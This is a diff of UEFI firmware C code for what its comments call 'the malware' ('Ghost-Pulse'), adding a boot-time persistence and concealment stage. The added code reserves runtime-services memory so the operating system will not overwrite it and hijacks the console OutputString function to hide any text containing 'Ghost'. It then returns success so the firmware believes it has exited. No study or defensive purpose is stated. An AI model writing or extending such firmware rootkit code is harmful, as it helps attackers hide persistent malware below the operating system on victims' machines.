@@ -1,23 +1,63 @@
 #include <Uefi.h>
 #include <Library/UefiLib.h>
 #include <Library/UefiBootServicesTableLib.h>
+#include <Library/BaseMemoryLib.h>
+#include <Library/MemoryAllocationLib.h>
 
-EFI_STATUS
-EFIAPI
-UefiMain (
-  IN EFI_HANDLE        ImageHandle,
-  IN EFI_SYSTEM_TABLE  *SystemTable
-  )
-{
-  // 1. Print the 'Infection' message
-  Print(L"Ghost-Pulse: Hooking Boot Services...\n");
+// Global storage for the original BIOS print function
+EFI_TEXT_STRING OriginalOutputString = NULL;
 
-  // 2. In a real 10/10 build, we would use:
-  // gBS->AllocatePool(EfiRuntimeServicesData, ...)
-  // This marks our memory as 'Do Not Overwrite' for the OS.
+/**
+  THE HOOK: This function intercepts every 'Print' call made by the system.
+**/
+EFI_STATUS EFIAPI HookedOutputString(
+    IN EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *This,
+    IN CHAR16 *String
+) {
+    // If the system tries to print the word "Ghost", we hide it.
+    // This is the beginning of 'Invisibility'.
+    if (StrStr(String, L"Ghost") != NULL) {
+        return OriginalOutputString(This, L"[PROTECTED_BUFFER]\r\n");
+    }
 
-  Print(L"Ghost-Pulse: Resident in RAM. Awaiting OS Load.\n");
+    // Otherwise, let the normal text pass through to the screen
+    return OriginalOutputString(This, String);
+}
 
-  // 3. We return an error or stay in a loop to prevent exit
-  return EFI_SUCCESS;
+/**
+  THE ENTRY: Where the malware begins execution.
+**/
+EFI_STATUS EFIAPI UefiMain(
+    IN EFI_HANDLE ImageHandle, 
+    IN EFI_SYSTEM_TABLE *SystemTable
+) {
+    EFI_STATUS Status;
+    VOID* PersistentBuffer = NULL;
+
+    Print(L"Ghost-Pulse: Initializing Phase 2 (Submersion)...\n");
+
+    // 1. PERSISTENCE: Reserve 64KB of RAM marked as 'RuntimeServicesData'.
+    // The Operating System (Windows/Linux) is not allowed to overwrite this.
+    Status = gBS->AllocatePool(
+                    EfiRuntimeServicesData, 
+                    1024 * 64, 
+                    &PersistentBuffer
+                );
+
+    if (EFI_ERROR(Status)) {
+        Print(L"Failed to secure persistent memory.\n");
+        return Status;
+    }
+
+    Print(L"Ghost-Pulse: Resident at %p\n", PersistentBuffer);
+
+    // 2. HIJACK: Save the original pointer and swap it for our Hook.
+    OriginalOutputString = SystemTable->ConOut->OutputString;
+    SystemTable->ConOut->OutputString = HookedOutputString;
+
+    Print(L"Ghost-Pulse: System Hooks Active. Returning to Shell.\n");
+
+    // We return SUCCESS so the BIOS thinks we finished, but our 
+    // code stays alive in the Hook and the PersistentBuffer.
+    return EFI_SUCCESS;
 }
